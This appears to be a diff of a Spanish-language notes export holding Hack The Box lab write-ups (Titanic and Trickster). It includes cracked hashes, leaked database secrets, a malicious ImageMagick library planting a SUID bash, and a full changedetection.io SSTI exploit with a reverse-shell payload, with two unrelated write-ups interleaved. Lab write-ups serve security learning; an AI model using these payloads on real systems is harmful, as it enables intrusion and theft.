+kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg==:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw=:password
+cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg==:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs=:12345678
+]]></description><link>machines/titanic/1.recon.html</link><guid isPermaLink="false">Machines/Titanic/1.Recon.md</guid><pubDate>Mon, 17 Feb 2025 20:20:37 GMT</pubDate><enclosure url="machines/titanic/imgs/pasted-image-20250217165949.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/titanic/imgs/pasted-image-20250217165949.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivESC]]></title><description><![CDATA[ 
+ <br>Nos logeamos como developer por ssh:<br><br><img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"> <img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"> <img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"><br>
+<img alt="Pasted image 20250217193814.png" src="machines/titanic/imgs/pasted-image-20250217193814.png"><br><br>developer@titanic:~$ ps -aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+develop+    1156 29.1  0.9 1066036 37312 ?       Ss   16:01  47:07 /usr/bin/python3 /opt/app/app.py
+develop+    1767  1.4  6.6 1545764 262080 ?      Ssl  16:01   2:21 /usr/local/bin/gitea web
+develop+    1843  0.0  0.2  17196  9648 ?        Ss   16:01   0:01 /lib/systemd/systemd --user
+develop+    5666  0.0  0.1   8300  4240 ?        Ss   16:06   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-act
+develop+   50115  0.0  0.1   8788  5648 pts/4    Ss+  16:13   0:00 -bash
+develop+  541766  0.0  0.1   8792  5628 pts/3    Ss+  16:54   0:00 -bash
+develop+  825413  0.0  0.1   8812  5700 pts/1    Ss+  17:14   0:00 -bash
+develop+  888111  0.0  0.1   8656  5416 pts/2    Ss+  17:19   0:00 -bash
+develop+ 1211353  0.0  0.1   8788  5656 pts/6    Ss+  18:02   0:00 -bash
+develop+ 1312515  0.0  0.1   8780  5560 pts/7    Ss+  18:17   0:00 -bash
+develop+ 1428974  0.0  0.1   8788  5560 pts/0    Ss   18:29   0:00 -bash
+develop+ 1432094  0.0  0.1   9196  5596 pts/8    Ss+  18:30   0:00 -bash
+develop+ 1432162  0.0  0.1   8788  5600 pts/9    Ss+  18:30   0:00 -bash
+develop+ 1530131  0.0  0.1   8656  5392 pts/10   Ss   18:38   0:00 -bash
+develop+ 1553045 12.4  0.2 705804  9980 pts/0    Sl+  18:40   0:17 ./pspy64
+develop+ 1564135  0.0  0.0  10336  3752 pts/10   R+   18:42   0:00 ps -aux
+developer@titanic:~$ 
+
+<br><br>Tenemos ahi el puerto 3000 (gitea) y el 5000 (titanic python webpage)<br>Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:41935         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1156/python3        
 tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:43209         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      -                   
 udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
-udp        0      0 0.0.0.0:68              0.0.0.0:*                           -              
-<br>Parece que hay un mysql abierto; era de esperar porque es necesario para el funcionamiento de la pagina web.<br>Vamos a hacer un fuzzeo del directorio de Prestashop para buscar algo relacionado con una base de datos ; seguramente mysql que es la que funciona en el puerto 3306:<br>grep -ri "mysql" /var/www/
-grep -risE "(mysql|dbname|db_user|db_password|db_host|database)" /var/www/
-<br>Encuentro informacion interesante en la siguiente ruta<br>/var/www/prestashop/var/cache/prod/FrontContainer.php
-<br>        return [
-            'database_host' =&gt; '127.0.0.1',
-            'database_port' =&gt; '',
-            'database_name' =&gt; 'prestashop',
-            'database_user' =&gt; 'ps_user',
-            'database_password' =&gt; 'prest@shop_o',
-            'database_prefix' =&gt; 'ps_',
-            'database_engine' =&gt; 'InnoDB',
-            'mailer_transport' =&gt; 'smtp',
-            'mailer_host' =&gt; '127.0.0.1',
-            'mailer_user' =&gt; NULL,
-            'mailer_password' =&gt; NULL,
-            'secret' =&gt; 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
-            'ps_caching' =&gt; 'CacheMemcache',
-            'ps_cache_enable' =&gt; false,
-            'ps_creation_date' =&gt; '2024-05-25',
-            'locale' =&gt; 'en-US',
-            'use_debug_toolbar' =&gt; true,
-            'cookie_key' =&gt; '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
-            'cookie_iv' =&gt; 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
-<br><br>Bueno como dirian mis colegas del sector "we're in"<br>
-<img alt="Pasted image 20250213163524.png" src="machines/trickster/imgs/pasted-image-20250213163524.png"><br>MariaDB [(none)]&gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| prestashop         |
-+--------------------+
-<br>De la base de datos saco las siguientes credenciales;<br>admin@trickster.htb : $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
-james@trickster.htb : $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
-<br>Identificamos los hashes:<br>➜  Trickster hashcat credentials 
-hashcat (v6.2.6) starting in autodetect mode
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -           
+<br><br>developer@titanic:~$ find / -perm /4000 2&gt;/dev/null
+/snap/core20/2434/usr/bin/chfn
+/snap/core20/2434/usr/bin/chsh
+/snap/core20/2434/usr/bin/gpasswd
+/snap/core20/2434/usr/bin/mount
+/snap/core20/2434/usr/bin/newgrp
+/snap/core20/2434/usr/bin/passwd
+/snap/core20/2434/usr/bin/su
+/snap/core20/2434/usr/bin/sudo
+/snap/core20/2434/usr/bin/umount
+/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2434/usr/lib/openssh/ssh-keysign
+/snap/snapd/23545/usr/lib/snapd/snap-confine
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/bash
+/usr/bin/fusermount3
+developer@titanic:~$ find / -perm /2000 2&gt;/dev/null
+/snap/core20/2434/usr/bin/chage
+/snap/core20/2434/usr/bin/expiry
+/snap/core20/2434/usr/bin/ssh-agent
+/snap/core20/2434/usr/sbin/pam_extrausers_chkpwd
+/snap/core20/2434/usr/sbin/unix_chkpwd
+/snap/core20/2434/var/mail
+/var/log/journal
+/var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8
+/var/local
+/var/mail
+/run/log/journal
+/usr/local/share/fonts
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_extrausers_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/ssh-agent
+/usr/bin/bash
+/usr/bin/expiry
+/usr/bin/crontab
+/usr/bin/chage
 
-OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-============================================================================================================================================
-* Device #1: cpu-haswell-AMD Custom APU 0405, 6360/12785 MB (2048 MB allocatable), 8MCU
+<br><br>developer@titanic:/etc$ tree /etc/cron.d
+/etc/cron.d
+└── e2scrub_all
 
-The following 4 hash-modes match the structure of your input hash:
+0 directories, 1 file
+developer@titanic:/etc$ cat /etc/cron.d/e2scrub_all 
+30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
 
-      # | Name                                                       | Category
-  ======+============================================================+======================================
-   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
-  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
-  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
-  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
-
-
-<br>Creds :<br>
-Crackeamos las passwords con hashcat o john <br>john credentials --wordlist=/usr/share/wordlists/rockyou.txt
-hashcat -m 3200  credentials /usr/share/wordlists/rockyou.txt 
-<br>james : alwaysandforever
-<br><br>Nos logeamos por ssh<br>➜  Trickster ssh james@trickster.htb
-The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
-ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
-james@trickster.htb's password: 
-Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
-james@trickster:~$ id
-uid=1000(james) gid=1000(james) groups=1000(james)
-james@trickster:~$ whoami
-james
-james@trickster:~$ 
-<br>Sudo -l :<br>james@trickster:~$ sudo -l
-[sudo] password for james: 
-Sorry, user james may not run sudo on trickster.
-<br>Revisando la configuracion de la red vemos que tenemos acceso a una red de docker pero no podemos ejecutar comandos de docker ya que james no forma parte del grupo docker:<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
-    link/ether 00:50:56:94:e4:77 brd ff:ff:ff:ff:ff:ff
-    altname enp3s0
-    altname ens160
-    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
-       valid_lft forever preferred_lft forever
-3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
-    link/ether 02:42:18:3b:cb:65 brd ff:ff:ff:ff:ff:ff
-    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
-       valid_lft forever preferred_lft forever
-37: vethf843401@if36: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default 
-    link/ether 0e:e5:f9:ea:9f:36 brd ff:ff:ff:ff:ff:ff link-netnsid 0
-<br>viendo que tenemos una interfaz de ip's de docker vamos a escanear la red en búsqueda de posibles puntos de ataque;<br>Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)<br><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a><br><br>james@trickster:~$ for i in {1..254}; do ping -w 2 -c 1 172.17.0.$i | grep "64 bytes" | cut -d ' ' -f 4 | sed 's/://'; done;
-
-172.17.0.1
-172.17.0.2
-<br>Vemos que tiene conexion con 2 ips dentro del rango;<br>
-la 172.17.0.1 es la del propio host; mientras que la 172.17.0.2 parece de un container; vamos a investigar puertos abiertos<br><br>Escaneamos con nc el rango entero de puertos de la ip 172.17.0.2<br>james@trickster:~$ nc -vnz -w 1 172.17.0.2 1-65535 2&gt;&amp;1 | grep succeeded
-Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
-<br>Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh<br><br>Tenemos algun servicio corriendo en un docker en la ip 172.17.0.2 por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;<br>➜  ~ ssh james@trickster.htb -L 5000:172.17.0.2:5000
-<br>Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion<br>sudo nmap -sCV -p 5000 -v -Pn -n localhost
-PORT     STATE SERVICE VERSION                                       
-5000/tcp open  http    Python http.server 3.5 - 3.10
-| http-title: Change Detection
-|_Requested resource was /login?next=/
-| http-methods: 
-|_  Supported Methods: HEAD OPTIONS GET
-<br>Nos encontramos ante un changedetection.io en la v0.45.20<br>
-<img alt="Pasted image 20250214113934.png" src="machines/trickster/imgs/pasted-image-20250214113934.png"><br><br>Investigando sobre la version de changedetection.io ; vemos que la version es vulnerable a la un SSTI en la version actual <br>Un SSTI (Server-Side Template Injection) es una vulnerabilidad de seguridad que permite a un atacante inyectar y ejecutar código en la plantilla de una aplicación del lado del servidor, aprovechando malas prácticas en el procesamiento de datos dinámicos. Esto puede llevar a la ejecución remota de código, acceso no autorizado o robo de datos sensibles. Ocurre cuando la aplicación inserta entradas de usuario sin sanitizar en templates que son procesados por el servidor.<br>Para mas informacion sobre ataques SSTI podemos visitar la pagina de <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/server-side-template-injection" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger</a><br>Esta vulnerabilidad de changedetection.io esta documentada en el <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" target="_blank">CVE-2024-32651</a><br><br>Buscamos en github y hay un PoC que automatiza el proceso del SSTI ; pongo el codigo y lo analizamos;<br>Al siguiente script debemos pasarle las siguientes variables<br>
-<br>--url: URL base del sitio vulnerable (Nuestro caso: http://localhost:5000).
-<br>--port: Puerto en el que el atacante escuchará la conexión inversa 
-<br>--ip: Dirección IP del atacante para recibir la conexión inversa. (Nuestra interfaz tun0)
-<br>--notification: URL de notificación personalizada (opcional).
-<br># Exploit Title: changedetection &lt;= 0.45.20 Remote Code Execution (RCE)
-# Date: 5-26-2024
-# Exploit Author: Zach Crosman (zcrosman)
-# Vendor Homepage: changedetection.io
-# Software Link: https://github.com/dgtlmoon/changedetection.io
-# Version: &lt;= 0.45.20
-# Tested on: Linux
-# CVE : CVE-2024-32651
-
-from pwn import *
-import requests
-from bs4 import BeautifulSoup
-import argparse
-
-def start_listener(port):
-    listener = listen(port)
-    print(f"Listening on port {port}...")
-    conn = listener.wait_for_connection()
-    print("Connection received!")
-    context.newline = b'\r\n'
-    # Switch to interactive mode
-    conn.interactive()
-
-def add_detection(url, listen_ip, listen_port, notification_url=''):
-    session = requests.Session()
-    
-    # First request to get CSRF token
-    request1_headers = {
-        "Cache-Control": "max-age=0",
-        "Upgrade-Insecure-Requests": "1",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "Accept-Encoding": "gzip, deflate",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "close"
-    }
-
-    response = session.get(url, headers=request1_headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
-    print(f'Obtained CSRF token: {csrf_token}')
-
-    # Second request to submit the form and get the redirect URL
-    add_url = f"{url}/form/add/quickwatch"
-    add_url_headers = {  # Define add_url_headers here
-        "Origin": url,
-        "Content-Type": "application/x-www-form-urlencoded"
-    }
-    add_url_data = {
-        "csrf_token": csrf_token,
-        "url": "https://reddit.com/r/baseball",
-        "tags": '',
-        "edit_and_watch_submit_button": "Edit &gt; Watch",
-        "processor": "text_json_diff"
-    }
-
-    post_response = session.post(add_url, headers=add_url_headers, data=add_url_data, allow_redirects=False)
-
-    # Extract the URL from the Location header
-    if 'Location' in post_response.headers:
-        redirect_url = post_response.headers['Location']
-        print(f'Redirect URL: {redirect_url}')
-    else:
-        print('No redirect URL found')
-        return
-
-    # Third request to add the changedetection url with ssti in notification config
-    save_detection_url = f"{url}{redirect_url}"
-    save_detection_headers = {  # Define save_detection_headers here
-        "Referer": redirect_url,
-        "Cookie": f"session={session.cookies.get('session')}"
-    }
-
-    save_detection_data = {
-        "csrf_token": csrf_token,
-        "url": "https://reddit.com/r/all",
-        "title": '',
-        "tags": '',
-        "time_between_check-weeks": '',
-        "time_between_check-days": '',
-        "time_between_check-hours": '',
-        "time_between_check-minutes": '',
-        "time_between_check-seconds": '30',
-        "filter_failure_notification_send": 'y',
-        "fetch_backend": 'system',
-        "webdriver_delay": '',
-        "webdriver_js_execute_code": '',
-        "method": 'GET',
-        "headers": '',
-        "body": '',
-        "notification_urls": notification_url,
-        "notification_title": '',
-        "notification_body": f"""
-        {{% for x in ().__class__.__base__.__subclasses__() %}}
-        {{% if "warning" in x.__name__ %}}
-        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen_ip}\\",{listen_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
-        {{% endif %}}
-        {{% endfor %}}
-        """,
-        "notification_format": 'System default',
-        "include_filters": '',
-        "subtractive_selectors": '',
-        "filter_text_added": 'y',
-        "filter_text_replaced": 'y',
-        "filter_text_removed": 'y',
-        "trigger_text": '',
-        "ignore_text": '',
-        "text_should_not_be_present": '',
-        "extract_text": '',
-        "save_button": 'Save'
-    }
-    final_response = session.post(save_detection_url, headers=save_detection_headers, data=save_detection_data)
-
-    print('Final request made.')
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Add detection and start listener')
-    parser.add_argument('--url', type=str, required=True, help='Base URL of the target site')
-    parser.add_argument('--port', type=int, help='Port for the listener', default=4444)
-    parser.add_argument('--ip', type=str, required=True, help='IP address for the listener')
-    parser.add_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
-    args = parser.parse_args()
+<br>Este cronjob se utiliza para realizar una verificación programada de los sistemas de archivos ext4 cuando el sistema no está usando systemd . La herramienta e2scrub_all_cron revisa los sistemas de archivos en busca de errores y realiza tareas de mantenimiento.<br><br>Para seguir enumerando vamos a usar <a data-tooltip-position="top" aria-label="https://github.com/DominicBreuker/pspy" rel="noopener nofollow" class="external-link" href="https://github.com/DominicBreuker/pspy" target="_blank">pspy64</a><br>
+Es un programa que vigila procesos , archivos que se estan abriendo en el sistema, comandos que se ejecuten...<br>Esto nos ayuda a encontrar un posible corn job de root o algun servicio que ejecute comandos que se nos este escapando en el foothold;<br>Le decimos a pspy que printee tanto comandos como eventos del sistema de archivos a cada segundo<br>developer@titanic:~$ ./pspy64 -cpf -i 1000 | tee pspyrecord
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
 
-    add_detection(args.url, args.ip, args.port, args.notification)
-    start_listener(args.port)
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+
+<br>Revisando el log observamos que se esta ejecutando el binario de magick probablemente llamado por un cron job o por el script identify_images.sh<br>
+<img alt="Pasted image 20250217200648.png" src="machines/titanic/imgs/pasted-image-20250217200648.png"><br><br>Revisando el script de bash se esta ejecutando magick identify buscando archivos jpg en la ruta /opt/app/static/assets/images/ y guardandolo en un metadata.log<br>developer@titanic:~$ cat /opt/scripts/identify_images.sh
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify &gt;&gt; metadata.log
+<br>developer@titanic:~$ find / -type f -name metadata.log 2&gt;/dev/null
+/opt/app/static/assets/images/metadata.log
+
+developer@titanic:~$ cat /opt/app/static/assets/images/metadata.log
+/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.003
+/opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
+/opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000
+/opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000
+/opt/app/static/assets/images/root.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
+
+<br>Miramos la version de magick que es vulnerable al <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/cve-2024-41817" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/cve-2024-41817" target="_blank">CVE-2024-41817</a><br>
+<img alt="Pasted image 20250217203145.png" src="machines/titanic/imgs/pasted-image-20250217203145.png"><br>developer@titanic:~$ magick -version
+Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc (9.4)
+<br><br><a rel="noopener nofollow" class="external-link" href="https://github.com/ImageMagick/ImageMagick/issues/7568" target="_blank">https://github.com/ImageMagick/ImageMagick/issues/7568</a><br>
+Accrording to Tenable:<br>
+ImageMagick is a free and open-source software suite, used for editing and manipulating digital images. The AppImage version ImageMagick might use an empty path when setting MAGICK_CONFIGURE_PATH and LD_LIBRARY_PATH environment variables while executing, which might lead to arbitrary code execution by loading malicious configuration files or shared libraries in the current working directory while executing ImageMagick. The vulnerability is fixed in 7.11-36.<br>This script exploits a vulnerability in ImageMagick’s AppImage version (before 7.1.1-36) that improperly handles LD_LIBRARY_PATH, allowing arbitrary library loading.  <br>Creamos la libreria maliciosa y ejecutamos imagemagick<br>gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+__attribute__((constructor)) void init(){
+    system("sudo install -m =xs $(which bash) /tmp/bash");
+    exit(0);
+}
+EOF
+<br><img alt="Pasted image 20250217211424.png" src="lib/media/pasted-image-20250217211424.png"><br>
+<img alt="Pasted image 20250217211512.png" src="lib/media/pasted-image-20250217211512.png"><br><br>
 <br>
-<br>Configuración del Listener:
+Crea una Biblioteca Compartida Maliciosa (libxcb.so.1)
 
-<br>Inicia un listener en un puerto especificado para recibir una conexión inversa desde el servidor vulnerable.
-
-
-<br>Obtención del Token CSRF:
-
-<br>Realiza una solicitud GET al sitio objetivo para obtener un token CSRF necesario para realizar solicitudes autenticadas.
+<br>El código C dentro de ella se ejecuta al cargarse y copia el archivo /root/root.txt a /tmp/root.txt.
+<br>Esto se logra utilizando el atributo constructor, que ejecuta automáticamente el comando system("sudo install -m =xs $(which bash) /tmp/bash").
 
 
-<br>Creación de una Nueva Detección:
+<br>
+Prepara un Archivo de Imagen
 
-<br>Envía una solicitud POST para agregar una nueva URL a monitorear en la aplicación.
-<br>Utiliza este proceso para obtener una URL de redirección que permite editar la configuración de la detección.
-
-
-<br>Inyección de Código Malicioso:
-
-<br>En la configuración de notificaciones de la nueva detección, inserta un payload SSTI que:
-
-<br>Itera sobre las clases base del sistema Python.
-<br>Busca una clase con "warning" en su nombre.
-<br>Utiliza esta clase para importar y ejecutar comandos del sistema operativo.
-<br>Ejecuta un comando que establece una conexión inversa al IP y puerto del atacante usando python3 y bash.
+<br>Copia entertainment.jpg a root.jpg, posiblemente para desencadenar su procesamiento por ImageMagick.
 
 
-
-
-<br>Envío del Payload:
-
-<br>Guarda la configuración maliciosa enviando otra solicitud POST.
-<br>Esto activa el payload SSTI en el servidor vulnerable.
-
-
-<br>Recepción de la Conexión Inversa:
-
-<br>El servidor vulnerable ejecuta el código inyectado, conectándose al listener del atacante.
-<br>El atacante obtiene acceso interactivo a la shell del servidor.
-
-
-<br>El script no funciona, pruebo a reproducirlo paso a paso anadiendo debugs<br>Y es que el endpoint /login?next=/ Nos devuelve un 500 INTERNAL SERVER ERROR<br>
-<img alt="Pasted image 20250214124302.png" src="machines/trickster/imgs/pasted-image-20250214124302.png"><br>Pruebo a logearme con las credenciales de james alwaysandforever<br>
-Y entramos;<br>
-<img alt="Pasted image 20250214125118.png" src="machines/trickster/imgs/pasted-image-20250214125118.png"><br>Si pulsamos en backup nos decarga un comprimido; vamos a echarle un vistazo;<br>➜  backdump ls
-b86f1003-3ecb-4125-b090-27e15ca605b9  changedetection-backup-20250214115130.zip  url-list-with-tags.txt  url-watches.json
-bbdd78f6-db98-45eb-9e7b-681a0c60ea34  secret.txt                                 url-list.txt
-➜  backdump tree b86f1003-3ecb-4125-b090-27e15ca605b9 
-b86f1003-3ecb-4125-b090-27e15ca605b9
-|-- 3855b43e05c02a09c0b63be14f70a8bb.txt.br
-|-- 7fa5d9292139604c79d87fb69f21ffe2.txt.br
-|-- ce6278706b3912f01bf5355004eb538a.txt.br
-|-- cf0c62552e4672c2326c0ef0489883c8.txt.br
-|-- d589415eb5dbd392fa8874829ce30450.txt.br
-|-- dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
-`-- history.txt
-
-1 directory, 7 files
-➜  backdump cat b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt 
-───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: b86f1003-3ecb-4125-b090-27e15ca605b9/history.txt
-───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 1725049268,dd25d6c8b666e21ac6e596faa4d4a93d.txt.br
-   2   │ 1725093859,7fa5d9292139604c79d87fb69f21ffe2.txt.br
-   3   │ 1725955071,d589415eb5dbd392fa8874829ce30450.txt.br
-   4   │ 1726233055,cf0c62552e4672c2326c0ef0489883c8.txt.br
-   5   │ 1726596196,ce6278706b3912f01bf5355004eb538a.txt.br
-   6   │ 1726746285,3855b43e05c02a09c0b63be14f70a8bb.txt.br
-───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-➜  backdump cat url-list.txt 
-───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: url-list.txt
-───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ https://news.ycombinator.com/
-   2   │ https://changedetection.io/CHANGELOG.txt
-───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-➜  backdump cat secret.txt 
-───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: secret.txt
-───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 5fce75c64d33acf05d2d3b21d29e693d992f240d5c440310cff3edfb743c64a5
-
-<br><br>En el exploit de Python anterior, vimos la existencia de una flag llamada “–notification”, identificamos en el pie del campo “Notification Body” que usa Jinja2, esto nos permite ejecutar ataques de tipo SSTI (Server-Side Template Injection), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 80 y pulsamos en “Send test notification”:<br>Recibimos conexion con el servidor mandando una peticion por notification<br>
-<img alt="Pasted image 20250214130533.png" src="machines/trickster/imgs/pasted-image-20250214130533.png"><br>
